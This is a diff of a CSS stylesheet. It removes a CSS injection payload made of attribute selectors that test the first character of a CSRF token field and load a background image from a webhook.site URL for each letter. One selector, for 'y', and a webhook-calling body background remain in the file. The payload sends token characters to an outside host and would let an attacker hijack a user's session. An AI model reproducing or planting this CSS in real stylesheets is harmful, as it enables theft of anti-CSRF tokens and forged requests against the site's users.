@@ -107,30 +107,5 @@ form > input[type='submit'] {
 body {
         background-image: url("https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/test");
 }
-
-input[name=csrf][value^=a]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/a);}
-input[name=csrf][value^=b]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/b);}
-input[name=csrf][value^=c]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/c);}
-input[name=csrf][value^=d]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/d);}
-input[name=csrf][value^=e]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/e);}
-input[name=csrf][value^=f]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/f);}
-input[name=csrf][value^=g]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/g);}
-input[name=csrf][value^=h]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/h);}
-input[name=csrf][value^=i]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/i);}
-input[name=csrf][value^=j]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/j);}
-input[name=csrf][value^=k]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/k);}
-input[name=csrf][value^=l]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/l);}
-input[name=csrf][value^=m]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/m);}
-input[name=csrf][value^=n]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/n);}
-input[name=csrf][value^=o]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/o);}
-input[name=csrf][value^=p]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/p);}
-input[name=csrf][value^=q]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/q);}
-input[name=csrf][value^=r]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/r);}
-input[name=csrf][value^=s]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/s);}
-input[name=csrf][value^=t]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/t);}
-input[name=csrf][value^=u]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/u);}
-input[name=csrf][value^=v]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/v);}
-input[name=csrf][value^=w]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/w);}
-input[name=csrf][value^=x]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/x);}
 input[name=csrf][value^=y]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/y);}
-input[name=csrf][value^=z]{background-image:url(https://webhook.site/ae848f72-41d7-48b2-a0a3-d9cb98cd2a93/z);}
+
